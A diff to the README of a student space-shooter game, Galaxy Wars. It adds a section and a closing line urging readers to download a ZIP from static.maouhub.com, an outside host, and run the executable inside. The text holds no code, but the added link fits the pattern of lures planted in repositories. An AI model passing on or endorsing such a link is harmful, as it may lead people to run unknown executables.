@@ -58,6 +58,19 @@ The project is organized into several packages:
 3. Hold the left mouse button for continuous shooting (when automatic power-up is active)
 4. Press ESC to pause the game or return to the main menu
 
+## Try the Game
+
+Want to experience Galaxy Wars for yourself? You can download the game using the link below:
+
+[Download Galaxy Wars](https://static.maouhub.com/GalaxyWars.zip)
+
+To play:
+1. Download the ZIP file
+2. Extract the contents
+3. Run the executable file to start the game
+
+Enjoy defending your planet from the meteor onslaught!
+
 ## Development Process
 
 Working on Galaxy Wars was an incredible learning experience. Our team of five collaborated on various aspects of the game:
@@ -71,3 +84,5 @@ We faced challenges in implementing smooth gameplay mechanics, balancing difficu
 ## Conclusion
 
 Galaxy Wars showcases the power of Object-Oriented Programming in game development. It demonstrates how concepts like inheritance, encapsulation, and polymorphism can be applied to create a functional and enjoyable game. This project not only enhanced our programming skills but also gave us valuable experience in teamwork and project management.
+
+We hope you enjoy playing Galaxy Wars as much as we enjoyed creating it. Don't forget to download the game and test your skills as a planetary defender!
